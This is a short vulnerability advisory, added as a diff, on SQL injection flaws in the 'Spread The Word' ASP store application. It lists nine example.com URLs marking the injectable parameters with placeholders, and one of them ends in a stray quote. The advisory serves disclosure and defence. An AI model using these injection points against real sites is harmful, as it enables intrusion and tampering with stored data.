@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/13737/info
+
+Spread The Word is prone to multiple SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.
+
+Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation. 
+
+http://www.example.com/store/BrowseCategories.asp?Cat0=783[SQL-INJECTION]&Cat0Literal=Gifts&Cat1=839&Cat1Literal=Bible
+http://www.example.com/store/BrowseCategories.asp?Cat0=783&Cat0Literal=Gifts&Cat1=839[SQL-INJECTION]&Cat1Literal=Bible
+http://www.example.com/store/Search.asp?SearchType=565[SQL-INJECTION]&strSearch=lalala
+http://www.example.com/store/Search.asp?InStock=&SearchType=783&strSearch=1&SearchCat1=-1&SearchCat2=-1&PriceMin=&PriceMax=&PublicationDate='
+http://www.example.com/store/ViewItem.asp?ISBN=0789906651[SQL-INJECTION]&Cat0=565
+http://www.example.com/store/ViewItem.asp?ISBN=0789906651&Cat0=565[SQL-INJECTION]
+http://www.example.com/store/STWShowContent.asp?idRightPage=13032[SQL-INJECTION]
+http://www.example.com/store/MySide.Asp?Cat0=565[SQL-INJECTION]&Cat0Literal=Bibles
+http://www.example.com/store/BrowseMain.asp?Cat0=565[SQL-INJECTION]&Cat0Literal=Bibles&CurHigh=4 
